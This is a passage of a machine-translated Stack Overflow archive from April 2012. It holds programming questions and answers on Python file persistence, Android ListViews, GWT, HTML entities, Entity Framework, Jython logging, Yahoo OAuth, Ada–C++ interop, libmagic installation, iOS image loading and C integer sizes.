[http://docs.python.org/library/pickle.html](http://docs.python.org/library/pickle.html)

```
import pickle

def saveScore(score):
    pickle.dump(score, 'topfive2.txt')

def loadScore():
    return pickle.load('topfive2.txt') 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-26T18:15:15.710

在 Python 中读取和写入文件[非常简单](http://docs.python.org/tutorial/inputoutput.html#reading-and-writing-files)：

```
# Opening a file for writing will return the file handle f
f = open('/tmp/workfile', 'w')

# You can then write to the file using the 'write' method
f.write('Hello world!\n')

# To read your data back you can use the 'read' or 'readlines' methods

# Read the entire file
str = f.read()

# Read the file one line at a time
line = f.readline()

# Read the file into a list
list = f.readlines() 
```

如果您想存储更多数据而不仅仅是最后一个分数，您可以考虑创建一个 SQLite3 数据库。Python 对 SQLite3 有很好[的内置支持](http://docs.python.org/library/sqlite3.html)。这是一个跨平台的文件系统数据库。该数据库只是磁盘上的常规文本文件，但它支持您期望从数据库中执行的许多 SQL 操作。

# android - 如果我们从视图参数访问字符串，AdapterView OnItemClickListener 会显示错误

> ID：10338943
> 
> 赞同：1
> 
> 时间：2012-04-26T18:05:34.070
> 
> 标签：android, android-listview, onitemclicklistener, android-adapterview

onItemClickListener 有以下参数 onItemClick(AdapterView arg0, View arg1,int arg2, long arg3) 我从 arg2 得到正确的结果，即选择的项目数但是当我尝试从视图程序访问字符串值时崩溃

```
 public void onItemClick(AdapterView<?> arg0, View arg1,int arg2, long arg3) 
        {
            String s = ((TextView)arg1).getText().toString();
            try
            {
                Log.v("----","ActionListener called"+arg2);
            }
            catch(Exception E)
            {
                Log.v("----","unable to get Text from Text field "+arg2);
            }
        } 
```

当我评论 Statement String S... 时，代码不会崩溃

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T18:15:03.457

问题不在此代码中，我遇到了类似的问题，实际上问题出在适配器的定义中尝试更改适配器的定义，它将起作用

ArrayAdapter 适配器 = new ArrayAdapter(this, android.R.layout.simple_list_item_single_choice, android.R.id.text1, Values);

# java - Android 应用程序与 GWT 应用程序通信

> ID：10338945
> 
> 赞同：2
> 
> 时间：2012-04-26T18:05:45.630
> 
> 标签：java, android, http, gwt, client-server

我正在为 Android 开发一个移动应用程序。该应用程序将充当我在appspot.com 上运行的另一个GWT 应用程序的前端。为了在两者之间进行通信，我需要将数据从客户端（Android Applcation）发送到服务器（GWT-application），然后必须对其进行处理并将数据发送回客户端。实现这一目标的最佳方法是什么？“最佳”是指足够简单，我可以理解和实施，但也符合良好实践。

非常感谢任何建议，因为我对 GWT 很陌生，在互联网上找不到很多支持。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T23:31:35.677

我在 Android 应用程序开发方面没有太多经验，但我想“向 GWT 应用程序发送数据”是指将数据发送到您的 App Engine 后端/服务器。

最后，GWT 只是编译为纯 Javascript 并在浏览器中运行。所以我看不出你想如何与你的应用程序的 GWT 部分进行通信。
但是，您可以通过在 App Engine 上运行的后端从您的 Android 应用程序发送数据，最终数据可以显示在您的 GWT 应用程序中，该应用程序可以通过任何浏览器（移动设备、桌面等）访问。

为此，我认为您可以选择以下两条路线之一：

1.  使用 JSON 或 XML 作为数据协议创建从您的 Android 应用程序到后端的 HTTPRequest
2.  在您的 Android 应用程序中使用 RequestFactory（内部使用 JSON）（有一个特殊的 Requestfactory_client.jar 包。有关详细信息，请参见[此处）。](https://stackoverflow.com/questions/8049351/how-to-use-the-gwt-requestfactory-in-android-syncadapter-always-getting-validat)

# asp.net - Html实体名称与实体编号？

> ID：10338946
> 
> 赞同：8
> 
> 时间：2012-04-26T18:05:45.880
> 
> 标签：asp.net, html, html-entities

我看到了这张表：![在此处输入图像描述](../Images/1a2d18a4f88dcff06735a1f4c137efa5.png)

当我编写 Asp.net 并想要显示这些特殊的 html 实体时，我使用实体*名称*。

（但两者似乎都有效）

问题 ：

在什么情况下我应该使用实体**编号**（而**不是**实体**名称**）？

ps 我见过asp.net不喜欢实体*编号的情况*

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-26T18:11:16.423

关于何时应该使用[数字字符引用](http://en.wikipedia.org/wiki/Numeric_character_reference)（比如`&#163;`）而不是[字符实体引用](http://en.wikipedia.org/wiki/Character_entity_reference)（比如`&pound;`）或反之亦然，没有明确的指导。

只要字符实体引用是已定义的（您可以定义自己的），就可以使用它。

相反，如果未定义，则应使用数字字符引用。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-26T20:09:15.390

大多数字符都不需要使用它们中的任何一个。只需输入 UTF-8 或 ISO-8859-1 中的字符，无论您使用的是哪个。例如，如果您不知道如何键入不间断空格并且不想学习它，那么实体引用`&nbsp;`和字符引用`&#160;`是等价的，因此请使用您觉得不太容易混淆的那个。（后者*不是*实体引用，因此“实体编号”是用词不当。）

仅适用于“<” 对于“&”，当用作数据字符时，您是否需要“转义”符号，对于它们，我无法弄清楚为什么您会使用字符引用，而不是合理的助记实体引用`&lt;`和`&amp;`.

# c# - LINQ 实体框架选择一条记录

> ID：10338952
> 
> 赞同：0
> 
> 时间：2012-04-26T18:06:18.767
> 
> 标签：c#, entity-framework, c#-4.0, for-loop

我试图选择一条记录。在 db 中，我有第 1 个月和第 4 个月的两条记录。

我需要获取第 1 个月和第 4 个月的值，但我得到的只是迭代中两次（第 1 个月和第 4 个月）中第 1 个月的值。

EX：以 dB 为单位，第 1 个月的值为：55，第 4 个月的值为 22，但在代码中迭代时，我在第 1 个月和第 4 个月都得到了 55 的值。

```
 for (var month = 1; month <= 12; month++)
            {
    var itemMonth = month;
    var itemAuditReport = proxy.itemAuditReports.SingleOrDefault(i => i.SKU == itemSku && i.Month == itemMonth && i.Year==itemYear);
    //
    }
 if (itemAuditReport == null)
                    {
// Do Something
} 
```

我错过了什么吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T18:12:09.600

你为什么不试试

我猜这`itemAuditReport`是在迭代中分配的相同项目导致问题所以利用列表并在其中添加项目

```
List<Item> item = null;

for (var month = 1; month <= 12; month++)
{
 var itemMonth = month;
 var itemAuditReport = proxy.itemAuditReports.SingleOrDefault(i => i.SKU == itemSku && 
                       i.Month == itemMonth && i.Year==itemYear);
 if(itemAuditReport!=null)
   item.Add(itemAuditReport);
//
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-26T18:49:38.557

这将使您对错误有所了解。 [为什么在 lambda 表达式中使用迭代变量不好](https://stackoverflow.com/questions/227820/why-is-it-bad-to-use-a-iteration-variable-in-a-lambda-expression) 如果我找到可以帮助您解决问题的方法，我会告诉您。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-27T04:24:48.010

就像 John Sykor 建议的那样，试试这个：

```
for (var month = 1; month <= 12; month++)
{
  var itemMonth = month;
  var year = itemYear;
  var sku = itemSku;
  var itemAuditReport = proxy.itemAuditReports.SingleOrDefault(i => 
      i.SKU == sku && i.Month == itemMonth && i.Year==year);
} 
```

以下示例对此进行了更多解释：

这输出 10 十次。

```
List<Action> actions = new List<Action>();
for (int i = 0; i < 10; i++)
{
    actions.Add(() => Console.WriteLine(i));
}
foreach (Action action in actions)
{
    action();
} 
```

但以下输出 0...9 符合预期

```
List<Action> actions = new List<Action>();
for (int i = 0; i < 10; i++)
{
    var x = i; //<--important line
    actions.Add(() => Console.WriteLine(x));
}
foreach (Action action in actions)
{
    action();
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-01T18:19:08.207

是的，实体框架模型中的键设置不正确，Sku 被设置为带标题的主键。在模型中，因此带来相同的结果集。

我更改了要在 Sku、月份和年份上应用的密钥，效果很好！

# logging - 在 Jython 中编写带有时间戳和计数器的简单记录器

> ID：10338953
> 
> 赞同：3
> 
> 时间：2012-04-26T18:06:19.450
> 
> 标签：logging, timestamp, jython, sikuli

我正在尝试在 Jython 中编写一个简单的记录器，但我似乎无法在网上找到任何工作示例。

我检查了[http://www.jython.org/docs/library/logging.html](http://www.jython.org/docs/library/logging.html)但代码似乎对我不起作用。

我只想有一个简单的循环，每三十秒将带有**时间戳的字符串和消息（日志编号/计数）记录到日志文件中。**我正在使用[Sikuli](http://sikuli.org)在 Windows 中执行此操作。

日志消息示例：

```
2012-04-26 13:25:51 message number 75 
```

谁能帮我吗。

提前致谢，

马旺

PS - 我以前从未使用过 Jython。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-27T08:38:29.120

对于这样一个简单的事情，您可以编写简单的例程：

```
import time

LOG_CNT = 0

def log(msg):
    global LOG_CNT
    LOG_CNT += 1
    dts = time.strftime('%Y-%m-%d %H:%M:%S')
    f = open('log.txt', 'a')
    f.write('%s: msg# %d: %s\n' % (dts, LOG_CNT, msg))
    f.close()

def test():
    log('zorro')
    time.sleep(5)
    log('bubu')

test() 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-27T16:36:58.900

@Michał Niklas 的答案要好得多，但另一种方法是使用记录到标准输出的 python print 语句。

```
def log(msg):
    global LOG_CNT
    LOG_CNT += 1
    dts = time.strftime('%Y-%m-%d %H:%M:%S')
    print dts + "msg#" + LOG_CNT + msg 
```

如果从命令行运行 Sikuli，这可以通过管道传输到文件。

sikli-ide.exe myProject.sikuli > stdoutfile.txt

Sikuli 还记录内部消息，因此这是一个比创建自己的日志文件更丑陋的解决方案，但可能会派上用场，尤其是在编写/调试 sikuli 脚本时。

# javascript - NodeJS 的 nextTick 错误

> ID：10338954
> 
> 赞同：1
> 
> 时间：2012-04-26T18:06:35.767
> 
> 标签：javascript, node.js, yahoo-api

我正在尝试测试在此[站点](http://developer.yahoo.com/messenger/guide/exchangepartforoauthcredentials.html)中找到的 Yahoo API 。`throws process.nextTick`但是我可以获得一个“请求令牌”，由于我的应用程序错误，我似乎无法弄清楚如何继续

此外，如果可能的话，可以以某种方式帮助分享一些关于如何根据上面提供的站点制作请求代码的代码。下面是我的实现：

```
var request = https.request({
    host: "api.login.yahoo.com",
    port: 443,
    method: "GET",
    path: "/oauth/v2/get_token?"
        + "&oauth_consumer_key=abc123--"
        + "&oauth_signature_method=PLAINTEXT"
        + "&oauth_nonce=123456"
        + "&oauth_timestamp=1204762971"
        + "&oauth_signature=abc12345%26"
        + "&oauth_version=1.0"
        + "&oauth_token=" + requestToken
}, function(res){
    res.on('data', function(chunk){
        util.log('OAUTH CREDENTIALS: ' + chunk);
    })
}); 
```

**错误：**

```
Error: socket hang up
at EventEmitter._tickCallback (node.js:192:40) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-29T04:10:57.453

问题是该 API 没有被激活来访问任何雅虎服务，从我激活的站点 API 管理现在它可以工作了，多么愚蠢。

# c++ - 您可以将 Ada 泛型函数导出到 C++ 吗？

> ID：10338956
> 
> 赞同：5
> 
> 时间：2012-04-26T18:06:45.177
> 
> 标签：c++, c, ada

我已经看到很多地方可以使用导出/导入关键字在 Ada/C/C++ 之间进行通信。如果 Ada 函数是泛型的呢？这甚至可能吗？

我的问题是我需要重用一些遗留代码，而且我们有许多通用的 Ada 函数。即将到来的新层将用 C++ 编写，我希望能够将这些现有的 Ada 泛型函数导出到 C++ 包装器。（实际上，如果函数不是全局的，我将需要另一层，但现在不要介意。）

如果不可能，我只需要创建特定于不同类型的新的单个 Ada 函数，这些函数又调用泛型。对这种方法有什么想法吗？

我绝对是 Ada 编程的菜鸟，所以请原谅我的无知。谢谢您的帮助。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-27T00:10:21.830

编写一个小的 Ada 包，其规范包含[导出的子程序，其主体使用](http://www.adaic.org/resources/add_content/standards/05rm/html/RM-B-1.html)[*§B.3 与 C 和 C++ 接口中*](http://www.adaic.org/resources/add_content/standards/05rm/html/RM-B-3.html)可用的类型实例化这些子程序。不要忽视在 C 方调用`adainit()`和`adafinal()`。更多[在这里](https://stackoverflow.com/q/10180040/230513)。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-04-26T18:34:11.723

我对 Ada 不熟悉，但是您应该能够调用导出的函数（假设 Ada 编译器没有做太不正常的事情）。您应该尝试转储 Ada 目标文件（编译结果）以检查函数名称。

# ruby - 在新的 RHEL6 服务器上安装 ruby -filemagic gem 有困难

> ID：10338960
> 
> 赞同：13
> 
> 时间：2012-04-26T18:07:22.353
> 
> 标签：ruby, ruby-on-rails-3.1, rubygems, bundler

它似乎正在寻找 libmagic.so.1 文件。我有那个文件。它位于 /usr/lib64。我没有以 root 用户身份运行此安装。

我也在使用 rvm 和 Bundler。这是我的“bundle”命令的结果，当它到达我的 Gemfile 中的 ruby​​-filemagic 行时：

```
[server@mine ext]$ ruby extconf.rb --with-magiclib
checking for magic_open() in -ltrue... no
*** ERROR: missing required library to compile this module
*** extconf.rb failed ***
Could not create Makefile due to some reason, probably lack of
necessary libraries and/or headers.  Check the mkmf.log file for more
details.  You may need configuration options. 
```

更新：

以下是 mkmf.log 的结果：

```
have_library: checking for magic_open() in -ltrue... -------------------- no

"gcc -o conftest -I. -I/usr/local/rvm/rubies/ruby-1.8.7-p358/lib/ruby/1.8/x86_64-linux -I.    -g -O2  -fPIC   conftest.c  -L. -L/usr/local/rvm/rubies/ruby-1.8.7-p358/lib -Wl,-R/usr/local/rvm/rubies/ruby-1.8.7-p358/lib -L.  -rdynamic -Wl,-export-dynamic     -lruby-static -ltrue  -lrt -ldl -lcrypt -lm   -lc"
conftest.c: In function ‘t’:
conftest.c:3: error: ‘magic_open’ undeclared (first use in this function)
conftest.c:3: error: (Each undeclared identifier is reported only once
conftest.c:3: error: for each function it appears in.)
checked program was:
/* begin */
1: /*top*/
2: int main() { return 0; }
3: int t() { void ((*volatile p)()); p = (void ((*)()))magic_open; return 0; }
/* end */

"gcc -o conftest -I. -I/usr/local/rvm/rubies/ruby-1.8.7-p358/lib/ruby/1.8/x86_64-linux -I.    -g -O2  -fPIC   conftest.c  -L. -L/usr/local/rvm/rubies/ruby-1.8.7-p358/lib -Wl,-R/usr/local/rvm/rubies/ruby-1.8.7-p358/lib -L.  -rdynamic -Wl,-export-dynamic     -lruby-static -ltrue  -lrt -ldl -lcrypt -lm   -lc"
/usr/bin/ld: cannot find -ltrue
collect2: ld returned 1 exit status
checked program was:
/* begin */
1: /*top*/
2: int main() { return 0; }
3: int t() { magic_open(); return 0; }
/* end */ 
```

* * *

我不知道该怎么做才能完成这项工作。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-05-05T16:16:49.377

在 Ubuntu 12.04 上有同样的问题。刚刚`libmagic-dev`通过以下命令安装了软件包：

```
sudo apt-get install libmagic-dev 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2013-01-02T09:41:57.803

在 Mac 上，使用自制软件：

```
sudo brew install libmagic 
```

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2012-04-30T15:47:19.307

我需要做：

```
yum install file-devel 
```

这显然包含了 filemagic ruby​​ gem 编译所需的 libmagic 头文件。在那之后它就像一个冠军。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-01T09:04:35.233

我在 OpenSuse 11.3 上遇到了同样的问题。这有助于：

```
zypper install file-devel 
```

# android - 带有 XML 文件链接的 ListView 按钮

> ID：10338962
> 
> 赞同：0
> 
> 时间：2012-04-26T18:07:35.487
> 
> 标签：android, xml, listview, button

我正在开发如下所示的 android 应用程序：

（ListView 开始）

名称 - 游戏

日期

链接（按钮）

* * *

名称 2 - 游戏 2

日期2

Link2（按钮）

（列表视图结束）

那是在 ListView 中。所以一个 ListView Elemnt 是：名称、游戏、日期（TextView）和链接（按钮）所有数据都来自一个 XML 文件

所以我的问题是：如何获取按钮中的链接？比如从 XML 文件到 ListView Element1 中的按钮的链接 1 等等。已经检查了一些教程，但无法使用我的代码：

```
public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.listplaceholder);

        ArrayList<HashMap<String, String>> mylist = new ArrayList<HashMap<String, String>>();

        String xml = XMLfunctions.getXML();
        Document doc = XMLfunctions.XMLfromString(xml);

        int numResults = XMLfunctions.numResults(doc);

        if((numResults <= 0)){
            Toast.makeText(Main.this, "...", Toast.LENGTH_LONG).show();  
            finish();
        }

        NodeList nodes = doc.getElementsByTagName("result");

        for (int i = 0; i < nodes.getLength(); i++) {                            
            HashMap<String, String> map = new HashMap<String, String>();    

            Element e = (Element)nodes.item(i);
            if(i==0){
                TextView update= (TextView) findViewById(R.id.textView6);
                update.setText("last Update: "+XMLfunctions.getValue(e, "update"));
            } else {

            map.put("name", XMLfunctions.getValue(e, "name")+": " + XMLfunctions.getValue(e, "game") );
            map.put("date", XMLfunctions.getValue(e, "date"));
             mylist.add(map);    
            }    
        }        
        ListAdapter adapter = new SimpleAdapter(this, mylist , R.layout.main, 
                        new String[] { "name", "date" }, 
                        new int[] { R.id.item_title, R.id.item_date });

        setListAdapter(adapter);

        final ListView lv = getListView();        
        lv.setTextFilterEnabled(true); 
```

编辑

我解析的xml示例：

```
<result>
<id>1</id>
<name>test</name>
<game>gamename</game>
<date>27.04</date>
<link>www.google.com</link>
</result>
<result>
<id>2</id>
<name>test2</name>
<game>gamename2</game>
<date>27.04</date>
<link>www.google.com</link>
</result> 
```

和 listplaceholder 布局

```
<ListView
    android:id="@id/android:list"
    android:layout_width="fill_parent"
    android:layout_height="280dp"
    android:drawSelectorOnTop="false" android:scrollbars="horizontal|vertical"/> 
```

和主布局（ListView的布局）

```
<TableLayout
        android:layout_width="wrap_content"
        android:layout_height="fill_parent" >

        <TableRow
            android:id="@+id/tableRow1"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content" >

            <TextView
                android:id="@+id/item_title"
                android:layout_width="146dp"
                android:layout_height="wrap_content"
                android:padding="2dp"
                android:textAppearance="?android:attr/textAppearanceMedium"
                android:textSize="10dp" />

        </TableRow>
         <TableRow
            android:id="@+id/tableRow2"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content" >
            <TextView
                android:id="@+id/item_date"
                android:layout_width="150dp"
                android:layout_height="wrap_content"
                android:padding="2dp"
                android:textAppearance="?android:attr/textAppearanceSmall"
                android:textSize="10dp" />
            </TableRow>

        <TableRow
            android:id="@+id/tableRow3"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content" >

            <Button
                android:id="@+id/buttonlink"
                style="?android:attr/buttonStyleSmall"
                android:layout_width="10dp" android:layout_height="fill_parent"
                android:text="Link"
                 />

        </TableRow>

    </TableLayout> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T19:36:59.757

我刚刚添加了一个新的自己的适配器，它可以工作，所以如果有人正在寻找它：

```
public class DataAdapter extends ArrayAdapter<Data>   
        {

            private ArrayList<Daten> items;
            String url;

            public DatenAdapter(Context context, int textViewResourceId, ArrayList<Daten> items) {
                    super(context, textViewResourceId, items);
                    this.items = items;
            }
            @Override
            public View getView(final int position, View convertView, ViewGroup parent) {
                    View v = convertView;
                    if (v == null) {
                        LayoutInflater vi = (LayoutInflater)getSystemService(Context.LAYOUT_INFLATER_SERVICE);
                        v = vi.inflate(R.layout.list_element, null);
                    }
                    Daten o = items.get(position);

                    url = o.getUrl();
                    if (o != null) {

                            TextView name = (TextView) v.findViewById(R.id.item_title);
                            TextView datum = (TextView) v.findViewById(R.id.item_date);
                            if (name != null) {
                                  name.setText(o.getName()+" - "+o.getSpiel());                            }
                            if(datum != null){
                                  datum.setText("date: "+ o.getDate());

                            }
                    }
                    Button but = (Button) v.findViewById(R.id.buttonlink);

                    but.setOnClickListener(new View.OnClickListener() {
                        public void onClick(View view) {
                        openWebURL(getUrl(position));
                        }
                    });

                    return v;

            }

            private String getUrl(int index) {
                return d.get(index).getUrl();
            } 
```

# ios - 在从服务器加载图像之前加载“加载”图像？

> ID：10338963
> 
> 赞同：0
> 
> 时间：2012-04-26T18:07:39.620
> 
> 标签：ios, xcode, multithreading, ipad, photo-gallery

我是 iOS 开发的新手，所以请多多包涵。我正在尝试创建一个基本的照片库，但遇到了问题。当我开始这个项目时，我只是将所有图像都包含在我的项目中。现在，在拥有更多图像（400+）之后，我开始从服务器加载它们。我使用以下代码行制作了一组图像：

```
[UIImage imageWithData:[NSData dataWithContentsOfURL:[NSURL URLWithString:@"http://www.testsite.com/testPic.png"]]] 
```

显然，让用户等待从服务器加载 400 多个图像的数组是不可接受的。

所以我的问题是，如果我在我的项目中包含一张图片，上面写着“正在加载”，我如何才能显示该图片，直到从服务器加载实际图片？

我正在使用表格视图和滚动视图制作一个基本的网格样式照片库。它会加载几行小（缩略图）图像，当您单击一个时，它会全屏显示。

如果有帮助，我正在使用 Xcode 4.3、ARC 和故事板！

对不起，如果这令人困惑！

-碎纸机2794

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T18:28:51.933

一种方法是子类化`UIImageView`。当您分配它时，您放置默认图像（加载图像）或 a `UIActivityIndicator`，下载要显示的图像（在单独的线程中），并在下载图像时显示它。查看`NSURLRequest`并`NSURLConnection`下载图像。

*** 编辑 ***

这是我开发的代码示例。您可以以此为起点来开发您自己的加载图像类。可以通过`NSThread`用于图像加载来改进此类。

```
// ImageLoader.h

#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>

/**
 *  @brief  Class that loads an UIImage from a server
 *  @author Nicolas
 */
@interface ImageLoader : UIView 
{
    @private
    NSURLConnection         *connection;
    NSMutableData           *data;
    NSString                *path;
    UIActivityIndicatorView *loading;
    UIImageView             *imageView;
}

@property (nonatomic, retain) UIActivityIndicatorView   *loading;
@property (nonatomic, retain) NSURLConnection           *connection;
@property (nonatomic, retain) NSMutableData             *data;
@property (nonatomic, retain) NSString                  *path;
@property (nonatomic, retain) UIImageView               *imageView;

/**
 *  Load an image from a server an display it
 *  @param URL URL to get the image
 *  @param chemin path to save the image
 *  @author Nicolas
 */
- (void)loadImageFromUrl:(NSString *)URL forPath:(NSString *)chemin;

@end

// ImageLoader.m

#import "ImageLoader.h"

@implementation ImageLoader
@synthesize path, connection, data, loading, imageView;

- (id)init
{
    self = [super init];
    [self setUserInteractionEnabled:YES];
    return self;
}

- (void)loadImageFromUrl:(NSString *)URL forPath:(NSString *)chemin
{
    //if (connection != nil)    [connection release];
    //if (data !=  nil)     [data release];
    //if (path != nil)      [path release];

    self.path = chemin;

    if ([[NSFileManager defaultManager] fileExistsAtPath:chemin])
    {
        if (imageView != nil)
        {
            [imageView removeFromSuperview];
            [imageView release];
        }
        imageView = [[UIImageView alloc] initWithFrame:self.bounds];
        imageView.image = [UIImage imageWithContentsOfFile:chemin];
        [self addSubview:imageView];
    }
    else 
    {
        loading = [[UIActivityIndicatorView alloc] initWithFrame:CGRectMake(0, 0, 20.0f, 20.0f)];
        loading.center = CGPointMake(self.frame.size.width/2, self.frame.size.height/2);
        [loading setActivityIndicatorViewStyle:UIActivityIndicatorViewStyleGray];
        [loading startAnimating];
        [self addSubview:loading];

        NSURL *myURL = [NSURL URLWithString:[URL stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]];      
        NSURLRequest *request = [NSURLRequest requestWithURL:myURL cachePolicy:NSURLRequestUseProtocolCachePolicy timeoutInterval:30.0f];
        connection = [[NSURLConnection alloc] initWithRequest:request delegate:self startImmediately:YES];
    }
}

#pragma mark -
#pragma mark NSURLConnection protocol

- (void)connection:(NSURLConnection *)_connection didReceiveData:(NSData *)_data
{
    if (data == nil)
    {
        data = [[NSMutableData alloc] initWithCapacity:2048];
    }
    [data appendData:_data];
}

- (void)connectionDidFinishLoading:(NSURLConnection *)_connection
{
    [data writeToFile:self.path atomically:YES];

    if (imageView != nil)
    {
        [imageView removeFromSuperview];
        [imageView release];
    }

    imageView = [[UIImageView alloc] initWithImage:[UIImage imageWithData:data]];
    imageView.frame = self.bounds;
    imageView.contentMode = UIViewContentModeScaleAspectFit;
    imageView.autoresizingMask = (UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight);
    [loading stopAnimating];
    [loading setHidden:YES];
    [self addSubview:imageView];
}

- (void)connection:(NSURLConnection *)_connection didFailWithError:(NSError *)error
{
    [loading stopAnimating];
    [loading release];
}

#pragma mark - Memory management

- (void)dealloc
{
    [connection cancel];
    [connection release];
    [imageView release];
    [path release];
    [data release];
    [super dealloc];
}

@end 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-26T18:38:31.290

最简单的方法是使用[AFNetworking](http://afnetworking.org/)，它`setImageWithURL:placeholderImage:`在一个类别中提供 on `UIImageView`（也是一个带有成功/失败处理程序的方法）。

# java - 鼠标点击二维数组注册

> ID：10338965
> 
> 赞同：0
> 
> 时间：2012-04-26T18:07:49.590
> 
> 标签：java, arrays, memory, mouse, boolean

大家好，我正在制作一个记忆游戏，它是一个 4x4 棋盘，您单击图块以显示下面的内容，您必须找到相应的图片。我在鼠标单击并将它们分配给guess1 和guess2 背后的逻辑时遇到问题。

Joption 面板是我测试猜测 1 和猜测 2 是否注册的方式。每次guess1都能正常工作，但我不知道如何让第二个猜测起作用这是我的尝试。

```
public void displayHit(Graphics g)
{
    //earlier on in the code mouseClicked provides the x and y indexes for the place where you click
    if (mouseClicked)
    {
        //method I coded to assign whereever you clicked on the 400x400 board to match the 4x4 array
        centerClick(x1,y1);
        guess1 = board[row][column];
        board[row][column] = board[x1][y1];
        guess1 = board[x1][y1];
        JOptionPane.showInputDialog(guess1 + "this is guess1");
        guess2 = -1;
        setColor(g);
        centerHit(xMouse, yMouse);
        g.fillOval(xMouse, yMouse, 40, 40);
        mouseClicked = false;

     if ((guess2 == -1) && (mouseClicked))
    {
        centerClick(x1,y1);
        guess2 = board[row][column];
        board[row][column] = board[x1][y1];
        guess2 = board[x1][y1];
        JOptionPane.showInputDialog(guess2 + "this is guess2");
    }
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T18:11:24.440

而（鼠标点击）

这看起来很糟糕。它要么意味着您要么没有释放 UI 线程来获得第二次点击，要么您正在非 UI 线程中调用图形操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-26T18:15:02.410

尝试这个

```
 boolean guess2Flag;    
 if (mouseClicked)
{

    if(!guess2Flag) 
    {
    centerClick(x1,y1);
    guess1 = board[row][column];
    board[row][column] = board[x1][y1];
    guess1 = board[x1][y1];
    JOptionPane.showInputDialog(guess1 + "this is guess1");
    guess2Flag = true;
    setColor(g);
    centerHit(xMouse, yMouse);
    g.fillOval(xMouse, yMouse, 40, 40);
    mouseClicked = false;
    }

    else if (guess2Flag)
    {
    centerClick(x1,y1);
    guess2 = board[row][column];
    board[row][column] = board[x1][y1];
    guess2 = board[x1][y1];
    JOptionPane.showInputDialog(guess2 + "this is guess2");
    guess2Flag = false;
    mouseClicked = false;
    }
} 
```

# c - 在 32 位机器上的一些小值上使用 __int8_t 是无用的优化工作？

> ID：10338966
> 
> 赞同：6
> 
> 时间：2012-04-26T18:07:52.087
> 
> 标签：c, optimization, int

我的函数有一些值通常小于 10。那么，如果我使用 __int8_t 而不是 int 来存储这个值是无用的优化努力吗？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-04-26T18:10:46.687

这不仅可能是无用的优化，而且您可能会导致整数未对齐（即整数未对齐到 4 字节或 8 字节边界，具体取决于架构），这实际上可能会降低性能。为了解决这个问题，大多数编译器尝试在大多数架构上对齐整数，因此您可能根本不会节省任何空间，因为编译器添加了填充（例如，用于基于堆栈的变量和结构成员）以正确对齐更大的变量或结构成员跟随你的 8 位整数。由于您的问题看起来像是关于函数中的局部变量并假设只有一个这样的变量并且该函数不是递归的，因此优化很可能是不必要的，您应该只使用平台本机整数大小（即，诠释）。

*如果您有很多*特定类型的实例并且您希望通过使用 8 位字段而不是 64 位字段用于结构中的小整数来消耗更少的内存，那么您提到的优化可能是值得的。如果这是您的意图，请务必为您的平台使用正确的编译指示和/或编译器开关，以便将结构正确打包到最小大小。另一个使用较小整数大小可以派上用场的例子是涉及数组，尤其是大数组时。最后，请记住，指定类型中的位数是不可移植的，正如其名称中的前导双下划线所示。

我冒昧地提及这一点，因为它似乎只与您的问题相关，但您可以在结构中使用比 8 位整数更小的值，甚至比 0-255 更小的值范围。在这种情况下，[位域](http://en.wikipedia.org/wiki/Bit_field)成为一种选择——微优化的缩影。不要使用位域，除非您已经在时间和空间域中实际测量了性能并且确定可以节省大量成本。为了进一步劝阻您，我在下一段中介绍了使用它们的一些陷阱。

位字段通过强制您手动排序结构成员以将数据打包到尽可能少的字节中，从而增加了开发过程的复杂性——这项任务不仅艰巨，而且通常会导致结构成员变量排序完全不直观。成员变量的更改、添加和删除通常会级联到跟随它们的成员，从而导致维护问题。为了解决这个问题，开发人员经常将填充和对齐位粘贴到结构中，这使得除了代码的原始开发人员之外的所有人的过程更加复杂。评论这样的代码不再是一件好事，而且经常成为一种必要。还有一个问题是开发人员忘记了他们正在处理代码中的一个位字段，并将其视为拥有其底层类型的整个域，

鉴于上述指导方针，分析您的应用程序以查看刚刚讨论的优化是否对您的特定编译器和平台有意义。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T15:17:56.600

它不会节省时间，但如果你有一百万个这样的东西，它将节省 3mb 的空间（这可能会节省时间）。

# python - 有没有一种简单的方法可以从 mpg 文件中打印出 1 和 0？

> ID：10338968
> 
> 赞同：1
> 
> 时间：2012-04-26T18:08:07.203
> 
> 标签：python, r, binary, mpeg

从事一个艺术项目，并希望将与声音增量相关的“1 和 0 的行向量”按顺序打印到屏幕上。我问的问题不好？如果是这样，对正确的问题陈述有什么想法？至于语言，我认为是 python 或 R。但如果有另一种语言可以建议我有点开放。

例子：

```
 $ 1.) 1010100000001111111010101110011101110101   (sound at time = 0)
 $ 2.) 1111100010101011010101011010110100010100   (sound at time = 1)
